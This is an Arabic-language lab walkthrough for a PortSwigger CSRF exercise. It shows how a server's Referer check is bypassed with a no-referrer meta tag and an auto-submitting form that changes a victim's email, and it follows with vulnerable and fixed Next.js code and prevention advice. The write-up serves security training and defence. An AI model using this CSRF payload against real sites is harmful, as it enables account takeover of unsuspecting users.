# Lab: CSRF where Referer validation depends on header being present

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يتحقق من **Referer header**، لكنه **يقبل الطلبات التي لا تحتوي على Referer نهائياً** (insecure fallback). سنستخدم `meta` tag لحذف الـ Referer ثم تنفيذ الهجوم.

**الحساب:** `wiener:peter`

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم آلية التحقق

- سجل الدخول بـ `wiener:peter`
- اذهب إلى **My account** → **Update email**
- اعترض الطلب في Burp:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Referer: https://YOUR-LAB-ID.web-security-academy.net/my-account
Cookie: session=YOUR-SESSION-COOKIE

email=test@test.com
```

### الخطوة 2: اختبار آلية التحقق من Referer

في Repeater:

| التغيير | النتيجة |
|---------|---------|
| تغيير `Referer` إلى domain مختلف | ❌ الطلب يرفض |
| **حذف `Referer` بالكامل** | ✅ **الطلب ينجح!** |

**الاستنتاج:** الخادم يتحقق فقط من وجود `Referer` صحيح، **لكنه يقبل الطلبات التي لا تحتوي على Referer نهائياً**.

### الخطوة 3: فهم كيف نمنع المتصفح من إرسال Referer

نضيف هذا الـ `meta` tag إلى صفحة الهجوم:

```html
<meta name="referrer" content="no-referrer">
```

هذا يخبر المتصفح: **لا ترسل Referer header** عند إرسال أي طلب من هذه الصفحة.

### الخطوة 4: بناء HTML للهجوم

```html
<meta name="referrer" content="no-referrer">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim%40attacker.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

### الخطوة 5: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML
- استبدل `YOUR-LAB-ID` بمعرف مختبرك
- اضغط **Store**

### الخطوة 6: تجربة الهجوم على نفسك

- اضغط **View exploit**
- ارجع إلى **My account** → لاحظ أن بريدك تغير ✅

### الخطوة 7: تسليم الهجوم للضحية

- غير البريد الإلكتروني إلى قيمة مختلفة
- اضغط **Store**
- اضغط **Deliver to victim**

### الخطوة 8: حل المختبر

بعد بضع ثوانٍ، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **كيف يتحقق الخادم من Referer؟** | يرفض الطلبات التي تأتي من domains مختلفة |
| **أين الثغرة؟** | الخادم يقبل الطلبات **بدون Referer** نهائياً (insecure fallback) |
| **كيف نمنع إرسال Referer؟** | باستخدام `<meta name="referrer" content="no-referrer">` |
| **ماذا يفعل هذا الـ meta tag؟** | يخبر المتصفح ألا يرسل Referer header في أي طلب من هذه الصفحة |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يتحقق من Referer، لكنه **يقبل الطلبات التي لا تحتوي على Referer** كـ fallback آمن بشكل خاطئ.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
export default function handler(req, res) {
  const { email } = req.body;
  const { sessionId } = req.cookies;
  const referer = req.headers.referer;
  
  // خطأ: يقبل الطلبات بدون Referer
  if (referer) {
    const url = new URL(referer);
    if (url.hostname !== req.headers.host) {
      return res.status(403).send('Invalid Referer');
    }
  }
  // إذا لم يكن هناك Referer، يمر الطلب بدون تحقق!
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
export default function handler(req, res) {
  const { email, csrfToken } = req.body;
  const { sessionId } = req.cookies;
  const referer = req.headers.referer;
  
  // التصحيح: رفض الطلبات بدون Referer
  if (!referer) {
    return res.status(403).send('Referer header missing');
  }
  
  const url = new URL(referer);
  if (url.hostname !== req.headers.host) {
    return res.status(403).send('Invalid Referer');
  }
  
  // طبقة دفاع إضافية: CSRF Token
  if (!verifyCsrfToken(sessionId, csrfToken)) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

**الخلاصة:** 
1. لا تقبل الطلبات بدون Referer كـ fallback آمن
2. استخدم CSRF Tokens كحماية أساسية، واعتبر Referer طبقة دفاع إضافية

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **رفض الطلبات بدون Referer:** لا تعتبرها آمنة.
2. **استخدام CSRF Tokens:** الحماية الأساسية.
3. **التحقق من Origin أيضاً:** كطبقة دفاع إضافية.
4. **لا تعتمد على Referer فقط:** يمكن حذفه أو تزويره.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
- [Referer Header Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
